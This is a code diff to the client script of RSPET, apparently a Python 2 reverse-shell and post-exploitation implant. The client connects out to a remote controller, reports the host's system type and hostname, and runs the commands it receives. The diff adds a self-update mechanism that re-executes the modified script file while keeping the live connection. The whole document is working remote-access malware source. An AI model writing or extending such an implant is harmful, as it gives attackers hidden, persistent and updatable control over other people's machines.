@@ -1,7 +1,6 @@
 #!/usr/bin/env python2
 # -*- coding: UTF-8 -*-
 """rspet_client.py: RSPET's Client-side script."""
-from __future__ import print_function
 from sys import exit as sysexit
 from sys import argv, modules
 from time import sleep
@@ -89,18 +88,21 @@ def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):
 
 class Client(object):
     """Class for Client."""
+    quit_signal = False
+    updated = False
+    sock = socket(AF_INET, SOCK_STREAM)
+    try:
+        cntx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+    except AttributeError:
+        # All PROTOCOL consts are merged on TLS in Python2.7.13
+        cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
+    sock = cntx.wrap_socket(sock)
+
     def __init__(self, addr, port=9000):
         # self.pipe = None
-        self.sock = socket(AF_INET, SOCK_STREAM)
-        try:
-            cntx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-        except AttributeError:
-            # All PROTOCOL consts are merged on TLS in Python2.7.13
-            cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        self.sock = cntx.wrap_socket(self.sock)
         self.address = addr
         self.port = int(port)
-        self.quit_signal = False
+        self.update_avail = False
         self.version = ("%s-%s" % (__version__, "full"))
         self.plugins = {}
         self.plugin_cmds = {}
@@ -116,7 +118,8 @@ class Client(object):
             '00008': 'KILL',
             '00009': 'loadPlugin',
             '00010': 'unloadPlugin',
-            '00011': 'runPluginCommand'
+            '00011': 'runPluginCommand',
+            '00012': 'update'
         }
         self.comm_swtch = {
             'killMe': self.kill_me,
@@ -129,12 +132,13 @@ class Client(object):
             'command': self.run_cm,
             'loadPlugin': self.load_plugin,
             'unloadPlugin': self.unload_plugin,
-            'runPluginCommand': self.run_plugin_cm
+            'runPluginCommand': self.run_plugin_cm,
+            'update': self.update
         }
 
     def loop(self):
         """Client's main body. Accept and execute commands."""
-        while not self.quit_signal:
+        while not Client.quit_signal and not self.update_avail:
             en_data = self.receive(5)
             try:
                 en_data = self.comm_dict[en_data]
@@ -143,34 +147,40 @@ class Client(object):
                     self.reconnect()
                 continue
             self.comm_swtch[en_data]()
-        self.sock.shutdown(SHUT_RDWR)
-        self.sock.close()
+        if Client.quit_signal:
+            try:
+                Client.sock.shutdown(SHUT_RDWR)
+                Client.sock.close()
+            except sock_error:
+                pass
 
     def connect(self):
         """Connect to the Server."""
         try:
-            self.sock.connect((self.address, self.port))
-            ###Send Version###
+            if not Client.updated:
+                Client.sock.connect((self.address, self.port))
+            ### Send Version ###
             # len is 2-digit (i.e. up to 99 chars)
             msg_len = get_len(self.version, 2)
             en_stdout = self.send(msg_len)
             en_stdout = self.send(self.version)
-            ##################
-            sys_type, sys_hname = sys_info()
-            ###Send System Type###
-            # len is 2-digit (i.e. up to 99 chars)
-            msg_len = get_len(sys_type, 2)
-            en_stdout = self.send(msg_len)
-            en_stdout = self.send(sys_type)
-            ######################
-            ###Send Hostname###
-            if sys_hname == "":
-                sys_hname = "None"
-            # len is 2-digit (i.e. up to 99 chars)
-            msg_len = get_len(sys_hname, 2)
-            en_stdout = self.send(msg_len)
-            en_stdout = self.send(sys_hname)
-            ###################
+            ####################
+            if not Client.updated:
+                sys_type, sys_hname = sys_info()
+                ### Send System Type ###
+                # len is 2-digit (i.e. up to 99 chars)
+                msg_len = get_len(sys_type, 2)
+                en_stdout = self.send(msg_len)
+                en_stdout = self.send(sys_type)
+                ########################
+                ### Send Hostname ###
+                if sys_hname == "":
+                    sys_hname = "None"
+                # len is 2-digit (i.e. up to 99 chars)
+                msg_len = get_len(sys_hname, 2)
+                en_stdout = self.send(msg_len)
+                en_stdout = self.send(sys_hname)
+                #####################
         except sock_error, ValueError:
             raise sock_error
         return 0
@@ -193,7 +203,7 @@ class Client(object):
         """Send data to Server."""
         r_code = 0
         try:
-            self.sock.send(data)
+            Client.sock.send(data)
         except sock_error:
             r_code = 1
             self.reconnect()
@@ -201,7 +211,7 @@ class Client(object):
 
     def receive(self, size):
         """Receive data from Server."""
-        data = self.sock.recv(size)
+        data = Client.sock.recv(size)
         if data == '':
             self.reconnect()
             raise sock_error
@@ -209,7 +219,10 @@ class Client(object):
 
     def kill_me(self):
         """Close socket, terminate script's execution."""
-        self.quit_signal = True
+        Client.quit_signal = True
+
+    def update(self):
+        self.update_avail = True
 
     def run_cm(self):
         """Get command to run from server, execute it and send results back."""
@@ -466,19 +479,39 @@ class Client(object):
 
 def main():
     """Main function. Handle object instances."""
+    import imp
     try:
         rhost = argv[1]
     except IndexError:
         sysexit()
-    try:
-        myself = Client(rhost, argv[2])
-    except IndexError:
-        myself = Client(rhost)
-    try:
-        myself.connect()
-    except sock_error:
-        myself.reconnect()
-    myself.loop()
+    update = False
+    while not modules[__name__].Client.quit_signal:
+        # Persist client's current socket
+        sock = modules[__name__].Client.sock
+        # Create dummy namespace to load new version under
+        module = imp.new_module('dummy')
+        # Read the file that replaced the current file
+        with open(__file__) as fl:
+            # Execute the contents of the file in the dummy module's namespace
+            exec fl.read() in module.__dict__
+        # Replace currect Client class with the one from the dummy module
+        Client = module.Client
+        # Replace currect version with the one from the dummy module
+        __version__ = module.__version__
+        # Persist client's current socket
+        Client.sock = sock
+        # Mark Client as updated
+        Client.updated = update
+        try:
+            myself = Client(rhost, argv[2])
+        except IndexError:
+            myself = Client(rhost)
+        try:
+            myself.connect()
+        except sock_error:
+            myself.reconnect()
+        myself.loop()
+        update = True
 
 
 # Start Here!
